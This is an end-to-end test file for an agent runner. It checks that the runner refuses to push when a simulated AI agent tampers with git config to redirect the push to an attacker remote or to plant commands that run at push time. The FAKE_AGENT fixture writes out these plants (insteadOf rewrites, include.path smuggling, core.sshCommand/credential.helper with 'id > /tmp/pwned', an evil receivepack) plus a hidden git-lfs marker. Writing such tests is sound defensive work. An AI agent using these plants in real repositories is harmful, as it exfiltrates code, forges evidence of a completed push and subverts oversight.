/**
 * E2E: the runner refuses to push when agent-written git config would redirect
 * the destination, or when the repo uses git-lfs (§8, vector 1 + 3).
 *
 * The runner pushes the claim branch from the AGENT-WRITABLE repo, and its
 * `commit` evidence (reachableOnRemote) is what the done-gate trusts. An agent
 * that repoints `remote.origin.url`, adds a `url.<attacker>.insteadOf`, or slips
 * in a second `pushurl` makes the push land on an attacker remote AND makes
 * ls-remote report reachableOnRemote=true against it — exfiltration plus a forged
 * record. The defence captures the effective push target BEFORE the agent runs
 * (recorded on the rails so the adopt path can reuse it) and refuses to push if
 * it has since diverged.
 *
 * Every hostile case is paired with a CONTROL assertion that the tampering is
 * actually live — the effective push URL really is the attacker's, or the
 * committed .gitattributes really binds git-lfs — so a broken fixture cannot let
 * the test pass while proving nothing. The runner's answer is then: no push to
 * anyone, item blocked, reachableOnRemote never forged true.
 */
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { AddressInfo } from 'node:net';
import { createMemoryEngine } from '@oahs/core';
import type { Actor, Evidence, Feature, WorkItem } from '@oahs/core';
import { makeClient, type OahsClient } from '@oahs/contracts';
import { TokenStore, buildServer } from '@oahs/spine-api';

import { git, runOnce, type RunnerOptions } from '../src/index.js';

const ADMIN_TOKEN = 'push-trust-admin';
const SPEC_FOLDER = 'delivery/pt';

const STORIES_YAML = `
- id: "1"
  title: redirect via remote.url
  description: agent repoints remote.origin.url
- id: "2"
  title: redirect via insteadOf
  description: agent adds url.<attacker>.insteadOf
- id: "3"
  title: second pushurl
  description: agent adds a second pushurl (fan-out exfil)
- id: "4"
  title: git-lfs repo
  description: agent commits a filter=lfs .gitattributes
- id: "5"
  title: happy path
  description: no tampering, push succeeds
- id: "6"
  title: adopt with redirect
  description: crash after a redirect plant, then adopt — rails anchor catches it
- id: "7"
  title: transport redirect via http.proxy
  description: agent diverts the push transport without changing the URL
- id: "8"
  title: insteadOf hidden behind include.path
  description: agent smuggles the rewrite through an included config file
- id: "9"
  title: git-lfs with the marker hidden from a binary-skipping grep
  description: agent marks .gitattributes binary to dodge detection
- id: "10"
  title: RCE via core.sshCommand
  description: agent adds a command knob that would run at push time
- id: "11"
  title: RCE via credential.helper
  description: agent adds a credential helper command
- id: "12"
  title: RCE via remote.origin.uploadpack
  description: agent adds an uploadpack command run by ls-remote
- id: "13"
  title: legit global core.sshCommand — no false block
  description: an operator's stable global command knob must not block
- id: "14"
  title: RCE via core.gitProxy
  description: agent adds a git:// proxy command
- id: "15"
  title: transport via remote.origin.proxy
  description: agent adds a remote-scoped proxy
- id: "16"
  title: RCE via core.askPass
  description: agent adds an askpass command (fires on https 401)
- id: "17"
  title: RCE via remote.origin.receivepack
  description: a command that fires on the file:// push itself
`;

/**
 * Fake agent: commit work, then perform the hostile action named by
 * OAHS_AGENT_MODE against the shared common config (reached from the worktree).
 * ATTACKER_URL / REAL_URL are passed through so the plant targets real repos.
 */
const FAKE_AGENT = `
import { execFileSync } from 'node:child_process';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
const cfg = (args) => execFileSync('git', ['config', ...args]);
mkdirSync('src', { recursive: true });
writeFileSync('src/work.txt', 'work for ' + (process.env.OAHS_STORY_ID ?? '?') + '\\n');
const mode = process.env.OAHS_AGENT_MODE ?? 'done';
if (mode === 'lfs') {
  writeFileSync('.gitattributes', '*.bin filter=lfs diff=lfs merge=lfs -text\\n');
  writeFileSync('src/asset.bin', 'PRETEND-LFS-POINTER\\n');
} else if (mode === 'lfs_hidden') {
  // Bind lfs AND mark .gitattributes itself binary — a 'git grep -I' would skip
  // the file and miss the marker while lfs stays live for the reviewer.
  writeFileSync('.gitattributes', '*.bin filter=lfs -text\\n*.gitattributes binary\\n');
  writeFileSync('src/asset.bin', 'PRETEND-LFS-POINTER\\n');
}
execFileSync('git', ['add', '-A']);
execFileSync('git', ['-c','user.name=A','-c','user.email=a@t.local','commit','-m','work']);
const ATT = process.env.OAHS_ATTACKER_URL, REAL = process.env.OAHS_REAL_URL;
if (mode === 'redirect_url') cfg(['remote.origin.url', ATT]);
else if (mode === 'redirect_insteadof') cfg(['url.' + ATT + '.insteadOf', REAL]);
else if (mode === 'second_pushurl') { cfg(['remote.origin.pushurl', REAL]); cfg(['--add','remote.origin.pushurl', ATT]); }
else if (mode === 'proxy') cfg(['http.proxy', 'http://attacker.invalid:9']);
else if (mode === 'include_insteadof') {
  // Write into the SHARED common dir so it outlives this worktree's removal.
  const common = resolve(process.cwd(), execFileSync('git', ['rev-parse', '--git-common-dir']).toString().trim());
  const inc = join(common, 'evil-include');
  writeFileSync(inc, '[url "' + ATT + '"]\\n\\tinsteadOf = ' + REAL + '\\n');
  cfg(['include.path', inc]); // the rewrite lives in an included file, invisible to --local --get-regexp
}
else if (mode === 'sshcommand') cfg(['core.sshCommand', 'sh -c "id > /tmp/pwned; ssh \\\\"$@\\\\""']);
else if (mode === 'credhelper') cfg(['credential.helper', '!sh -c "id > /tmp/pwned"']);
else if (mode === 'uploadpack') cfg(['remote.origin.uploadpack', '/tmp/evil-uploadpack']);
else if (mode === 'gitproxy') cfg(['core.gitProxy', '/tmp/evil-gitproxy']);
else if (mode === 'remoteproxy') cfg(['remote.origin.proxy', 'http://attacker.invalid:9']);
else if (mode === 'askpass') cfg(['core.askPass', '/tmp/evil-askpass']);
else if (mode === 'receivepack') {
  // A marker-writing receivepack: fires on the runner's own file:// push if it
  // is NOT refused, so the marker's ABSENCE proves the RCE was prevented.
  const m = process.env.OAHS_MARKER;
  const rp = m + '.sh';
  writeFileSync(rp, '#!/bin/sh\\necho FIRED > "' + m + '"\\nexit 1\\n');
  execFileSync('chmod', ['+x', rp]);
  cfg(['remote.origin.receivepack', rp]);
}
writeFileSync(process.env.OAHS_SPEC_FILE, ['---','status: done','---','','## Auto Run Result','Status: done',''].join('\\n'));
`;

type App = Awaited<ReturnType<typeof buildServer>>;
let app: App;
let baseUrl: string;
let admin: OahsClient;
let po: OahsClient;
let dev: OahsClient;
let feature: Feature;
let tmpRoot: string;
let repoDir: string;
let originDir: string;
let attackerDir: string;
let agentScript: string;
const specPaths = new Map<string, string>();

function commitAll(message: string): void {
  git(['add', '-A'], repoDir);
  git(['-c', 'user.name=S', '-c', 'user.email=s@t.local', 'commit', '-m', message], repoDir);
}

function options(mode: string): RunnerOptions {
  return {
    client: dev,
    repoPath: repoDir,
    specFolder: SPEC_FOLDER,
    agentCmd: `node ${agentScript} {STORY_ID}`,
    agentTimeoutMs: 30_000,
    agentEnv: { OAHS_AGENT_MODE: mode, OAHS_ATTACKER_URL: attackerDir, OAHS_REAL_URL: originDir },
  };
}

/** Effective push destination(s) of origin as seen from repoDir — the attacker's
 *  after a successful plant; the control that proves the fixture is live. */
function effectivePush(): string {
  return git(['remote', 'get-url', '--push', '--all', 'origin'], repoDir);
}

function branchOnRemote(bareRepo: string, branch: string): boolean {
  return git(['ls-remote', bareRepo, `refs/heads/${branch}`], tmpRoot).includes(branch);
}

async function readyForDev(id: string): Promise<void> {
  await po.call('advance_state', { workItemId: id, to: 'draft' });
  await po.call('approve_gate', { workItemId: id, gate: 'spec_approval', pinnedVerification: [] });
}

beforeAll(async () => {
  app = await buildServer({
    engine: createMemoryEngine(),
    tokenStore: new TokenStore(),
    adminToken: ADMIN_TOKEN,
  });
  await app.listen({ port: 0, host: '127.0.0.1' });
  const { port } = app.server.address() as AddressInfo;
  baseUrl = `http://127.0.0.1:${port}`;
  admin = makeClient({ baseUrl, token: ADMIN_TOKEN });

  const createdPo = await admin.call<{ actor: Actor; token: string }>('create_actor', {
    type: 'user',
    displayName: 'PO',
  });
  const createdDev = await admin.call<{ actor: Actor; token: string }>('create_actor', {
    type: 'agent',
    displayName: 'Dev',
  });
  for (const grant of [
    { actorId: createdPo.actor.id, permission: 'task.plan' },
    { actorId: createdPo.actor.id, permission: 'task.claim' },
    { actorId: createdPo.actor.id, permission: 'task.advance' },
    { actorId: createdPo.actor.id, permission: 'gate.spec.approve' },
    { actorId: createdPo.actor.id, permission: 'feature.init' },
    { actorId: createdPo.actor.id, permission: 'ops.force_release_claim' },
    { actorId: createdDev.actor.id, permission: 'task.claim' },
    { actorId: createdDev.actor.id, permission: 'task.advance' },
    { actorId: createdDev.actor.id, permission: 'task.block' },
  ]) {
    await admin.call('grant_permission', grant);
  }
  po = makeClient({ baseUrl, token: createdPo.token });
  dev = makeClient({ baseUrl, token: createdDev.token });

  tmpRoot = mkdtempSync(join(tmpdir(), 'oahs-push-trust-'));
  repoDir = join(tmpRoot, 'repo');
  originDir = join(tmpRoot, 'origin.git');
  attackerDir = join(tmpRoot, 'attacker.git');
  mkdirSync(repoDir, { recursive: true });
  agentScript = join(tmpRoot, 'agent.mjs');
  writeFileSync(agentScript, FAKE_AGENT, 'utf8');

  git(['init', '-b', 'main'], repoDir);
  writeFileSync(join(repoDir, 'README.md'), '# fixture\n', 'utf8');
  mkdirSync(join(repoDir, SPEC_FOLDER, 'stories'), { recursive: true });
  writeFileSync(join(repoDir, SPEC_FOLDER, 'stories.yaml'), STORIES_YAML, 'utf8');
  commitAll('baseline');

  feature = await po.call<Feature>('create_feature');
  await po.call('import_stories', { featureId: feature.id, yaml: STORIES_YAML });
  for (const key of ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17']) {
    const wi = await po.call<WorkItem>('get_work_item', { workItemId: key });
    const rel = `${SPEC_FOLDER}/${wi.specPath}`;
    specPaths.set(key, rel);
    writeFileSync(join(repoDir, rel), `---\nstatus: backlog\n---\n\n# Story ${key}\n`, 'utf8');
  }
  commitAll('spec files');

  // Real origin AND a separate attacker bare repo the agent will try to divert to.
  git(['clone', '--bare', repoDir, originDir], tmpRoot);
  git(['clone', '--bare', repoDir, attackerDir], tmpRoot);
  git(['remote', 'add', 'origin', originDir], repoDir);
});

afterAll(async () => {
  await app.close();
  rmSync(tmpRoot, { recursive: true, force: true });
});

// Belt-and-suspenders: even a case that throws before its inline scrubConfig()
// must not leak planted config (e.g. an evil receivepack) into the next case.
afterEach(() => scrubConfig());

/** Reset any config the previous case planted, so cases are independent. */
function scrubConfig(): void {
  git(['config', 'remote.origin.url', originDir], repoDir);
  for (const key of [
    'remote.origin.pushurl',
    `url.${attackerDir}.insteadOf`,
    'http.proxy',
    'include.path',
    'core.sshCommand',
    'credential.helper',
    'remote.origin.uploadpack',
    'core.gitProxy',
    'remote.origin.proxy',
    'core.askPass',
    'remote.origin.receivepack',
  ]) {
    // Non-throwing: --unset-all exits 5 when the key is absent.
    spawnSync('git', ['config', '--unset-all', key], { cwd: repoDir });
  }
}

describe('runner push-target trust (§8)', () => {
  it('CONTROL then REFUSE — redirect via remote.origin.url', async () => {
    await readyForDev('1');
    const result = await runOnce(options('redirect_url'));

    // CONTROL: the plant is live — origin's effective push URL is the attacker's.
    expect(effectivePush()).toContain(attackerDir);
    scrubConfig();

    // REFUSE: blocked, nobody got the branch, reachableOnRemote never forged true.
    expect(result.outcome).toBe('blocked');
    const branch = `claim/${result.claimId}`;
    expect(branchOnRemote(attackerDir, branch)).toBe(false);
    expect(branchOnRemote(originDir, branch)).toBe(false);
    const [commit] = (result.evidence ?? []).filter((e) => e.kind === 'commit');
    expect(commit?.payload).toMatchObject({ reachableOnRemote: false });
    expect(String(commit?.payload['pushRefused'])).toContain('changed since dispatch');
    expect((await po.call<WorkItem>('get_work_item', { workItemId: '1' })).blockedReason).toBe(
      'other',
    );
  });

  it('CONTROL then REFUSE — redirect via url.<attacker>.insteadOf', async () => {
    await readyForDev('2');
    const result = await runOnce(options('redirect_insteadof'));

    expect(effectivePush()).toContain(attackerDir); // CONTROL: insteadOf rewrites the push
    scrubConfig();

    expect(result.outcome).toBe('blocked');
    const branch = `claim/${result.claimId}`;
    expect(branchOnRemote(attackerDir, branch)).toBe(false);
    const [commit] = (result.evidence ?? []).filter((e) => e.kind === 'commit');
    expect(commit?.payload).toMatchObject({ reachableOnRemote: false });
    // Pin the redirect branch specifically, not just the shared blocked state.
    expect(String(commit?.payload['pushRefused'])).toContain('changed since dispatch');
  });

  it('CONTROL then REFUSE — a second pushurl (fan-out) is caught by the --all set', async () => {
    await readyForDev('3');
    const result = await runOnce(options('second_pushurl'));

    // CONTROL: both URLs are live push targets — the naive single-URL read would
    // have shown only the real one; the --all set the runner uses shows both.
    const all = effectivePush();
    expect(all).toContain(originDir);
    expect(all).toContain(attackerDir);
    scrubConfig();

    expect(result.outcome).toBe('blocked');
    const branch = `claim/${result.claimId}`;
    expect(branchOnRemote(attackerDir, branch)).toBe(false);
    expect(branchOnRemote(originDir, branch)).toBe(false); // refused entirely, not fanned out
  });

  it('CONTROL then REFUSE — a git-lfs repo is not pushed as a broken ref', async () => {
    await readyForDev('4');
    const result = await runOnce(options('lfs'));
    const branch = `claim/${result.claimId}`;

    // CONTROL: the committed .gitattributes really binds git-lfs.
    expect(git(['show', `${branch}:.gitattributes`], repoDir)).toContain('filter=lfs');

    expect(result.outcome).toBe('blocked');
    expect(branchOnRemote(originDir, branch)).toBe(false);
    const [commit] = (result.evidence ?? []).filter((e) => e.kind === 'commit');
    expect(commit?.payload).toMatchObject({ reachableOnRemote: false });
    expect(String(commit?.payload['pushRefused'])).toContain('git-lfs');
  });

  it('happy path — no tampering: push_target recorded, push succeeds, reachable true', async () => {
    await readyForDev('5');
    const result = await runOnce(options('done'));
    const branch = `claim/${result.claimId}`;

    expect(result.outcome).toBe('in_review');
    // The pre-agent anchor was recorded, and its URL entry is the real origin.
    const [target] = (result.evidence ?? []).filter((e) => e.kind === 'push_target');
    expect(target?.payload['remote']).toBe('origin');
    expect((target?.payload['guard'] as string[]).join('\n')).toContain(`push-url ${originDir}`);
    // The branch really landed on the real origin, and NOT on the attacker.
    expect(branchOnRemote(originDir, branch)).toBe(true);
    expect(branchOnRemote(attackerDir, branch)).toBe(false);
    const [commit] = (result.evidence ?? []).filter((e) => e.kind === 'commit');
    expect(commit?.payload).toMatchObject({ reachableOnRemote: true });
    expect(commit?.payload['pushRefused']).toBeUndefined();
  });

  it('adopt path — the rails anchor catches a redirect the crashed run left behind', async () => {
    await readyForDev('6');
    // The agent plants the redirect, then the runner crashes before reporting —
    // the pre-agent push_target is already on the rails, the poison persists in
    // the shared config, and no agent re-runs on adopt.
    const crashed = await runOnce({ ...options('redirect_url'), failpoint: 'before_report' });
    expect(crashed.outcome).toBe('crashed');
    expect(effectivePush()).toContain(attackerDir); // CONTROL: poison persists post-crash

    await po.call('force_release_claim', { workItemId: '6' });
    const adopted = await runOnce(options('done')); // mode irrelevant — no agent runs on adopt

    // The adopt push is verified against the rails-recorded (real) target, sees
    // the diverged (attacker) config, and refuses — nobody gets the branch.
    expect(adopted.outcome).toBe('blocked');
    scrubConfig();
    const crashedBranch = `claim/${crashed.claimId}`;
    expect(branchOnRemote(attackerDir, crashedBranch)).toBe(false);
    expect(branchOnRemote(originDir, crashedBranch)).toBe(false);
    const [commit] = (adopted.evidence ?? []).filter((e) => e.kind === 'commit');
    expect(commit?.payload).toMatchObject({ reachableOnRemote: false });
    expect(String(commit?.payload['pushRefused'])).toContain('changed since dispatch');
  });

  it('CONTROL then REFUSE — a transport redirect via http.proxy (URL unchanged)', async () => {
    await readyForDev('7');
    const result = await runOnce(options('proxy'));

    // CONTROL: the proxy plant is live in the shared config, and the URL is
    // UNCHANGED — a URL-only check would be blind to this transport redirect.
    expect(git(['config', '--get', 'http.proxy'], repoDir)).toContain('attacker.invalid');
    expect(effectivePush()).toContain(originDir); // URL still the real origin
    scrubConfig();

    // REFUSE anyway: the guard fingerprint includes the transport config, so the
    // divergence is caught. Nobody got the branch (a file:// push would have
    // SUCCEEDED, ignoring the proxy — so an empty origin proves we refused).
    expect(result.outcome).toBe('blocked');
    const branch = `claim/${result.claimId}`;
    expect(branchOnRemote(originDir, branch)).toBe(false);
    const [commit] = (result.evidence ?? []).filter((e) => e.kind === 'commit');
    expect(commit?.payload).toMatchObject({ reachableOnRemote: false });
    expect(String(commit?.payload['pushRefused'])).toContain('changed since dispatch');
  });

  it('CONTROL then REFUSE — insteadOf smuggled through include.path', async () => {
    await readyForDev('8');
    const result = await runOnce(options('include_insteadof'));

    // CONTROL: the rewrite is live (effective get-url resolves to the attacker),
    // yet it is INVISIBLE to a `config --local --get-regexp url.*` scan (exit 1,
    // no output) — the reason the guard reads the effective config, not scope.
    expect(effectivePush()).toContain(attackerDir);
    const localScan = spawnSync('git', ['config', '--local', '--get-regexp', '^url\\.'], {
      cwd: repoDir,
      encoding: 'utf8',
    });
    expect(localScan.status).not.toBe(0);
    expect(localScan.stdout.trim()).toBe('');
    scrubConfig();

    expect(result.outcome).toBe('blocked');
    const branch = `claim/${result.claimId}`;
    expect(branchOnRemote(attackerDir, branch)).toBe(false);
    const [commit] = (result.evidence ?? []).filter((e) => e.kind === 'commit');
    expect(String(commit?.payload['pushRefused'])).toContain('changed since dispatch');
  });

  it('CONTROL then REFUSE — git-lfs marker hidden behind a binary attribute', async () => {
    await readyForDev('9');
    const result = await runOnce(options('lfs_hidden'));
    const branch = `claim/${result.claimId}`;

    // CONTROL: lfs really is bound (and the file is marked binary to evade a
    // binary-skipping grep). A `git grep -I` would have missed it.
    const attrs = git(['show', `${branch}:.gitattributes`], repoDir);
    expect(attrs).toContain('filter=lfs');
    expect(attrs).toContain('*.gitattributes binary');

    expect(result.outcome).toBe('blocked');
    expect(branchOnRemote(originDir, branch)).toBe(false);
    const [commit] = (result.evidence ?? []).filter((e) => e.kind === 'commit');
    expect(String(commit?.payload['pushRefused'])).toContain('git-lfs');
  });

  // Vector 2: command knobs that execute at push/ls-remote time (RCE holding the
  // ssh-agent socket). The same fingerprint DETECTS the agent adding one and
  // refuses before the push — the command never runs.
  for (const [id, mode, key, marker] of [
    ['10', 'sshcommand', 'core.sshCommand', 'pwned'],
    ['11', 'credhelper', 'credential.helper', 'pwned'],
    ['12', 'uploadpack', 'remote.origin.uploadpack', 'evil'],
    ['14', 'gitproxy', 'core.gitProxy', 'evil'],
    ['15', 'remoteproxy', 'remote.origin.proxy', 'attacker'],
    ['16', 'askpass', 'core.askPass', 'evil'],
  ] as const) {
    it(`CONTROL then REFUSE — command/transport knob via ${key}`, async () => {
      await readyForDev(id);
      const result = await runOnce(options(mode));

      // CONTROL: the knob is live in the shared config (reading it does not
      // execute it), and it does not change the push URL.
      expect(git(['config', '--get', key], repoDir)).toContain(marker);
      expect(effectivePush()).toContain(originDir);
      scrubConfig();

      // REFUSE: the fingerprint diverged, so no push happened.
      expect(result.outcome).toBe('blocked');
      const branch = `claim/${result.claimId}`;
      expect(branchOnRemote(originDir, branch)).toBe(false);
      const [commit] = (result.evidence ?? []).filter((e) => e.kind === 'commit');
      expect(String(commit?.payload['pushRefused'])).toContain('changed since dispatch');
    });
  }

  it('CONTROL then REFUSE — remote.origin.receivepack: the command never fires', async () => {
    await readyForDev('17');
    const marker = join(tmpRoot, 'receivepack-marker');
    const base = options('receivepack');
    const result = await runOnce({ ...base, agentEnv: { ...base.agentEnv, OAHS_MARKER: marker } });
    const branch = `claim/${result.claimId}`;

    // PREVENTION: the runner blocked before its push, so its receivepack never
    // ran — the marker is absent. This is the teeth: not just a blocked outcome.
    expect(result.outcome).toBe('blocked');
    expect(existsSync(marker)).toBe(false);
    expect(branchOnRemote(originDir, branch)).toBe(false);

    // CONTROL: the knob is real and DOES fire on the runner's own kind of push —
    // one unprotected `git push origin <claim>` runs it and the marker appears.
    expect(git(['config', '--get', 'remote.origin.receivepack'], repoDir)).toContain('.sh');
    spawnSync('git', ['push', 'origin', branch], { cwd: repoDir, timeout: 30_000 });
    expect(existsSync(marker)).toBe(true);
    rmSync(marker, { force: true });
    scrubConfig();
  });

  it('no false block — a command knob present BEFORE the agent runs is trusted', async () => {
    await readyForDev('13');
    // An operator's own core.sshCommand, in place before dispatch: it is in the
    // pre-agent snapshot, so it does not diverge and does not block. (file://
    // push ignores it, so the value is inert for this test.)
    git(['config', 'core.sshCommand', 'ssh -o BatchMode=yes'], repoDir);
    const result = await runOnce(options('done'));
    scrubConfig();

    expect(result.outcome).toBe('in_review');
    expect(branchOnRemote(originDir, `claim/${result.claimId}`)).toBe(true);
  });
});
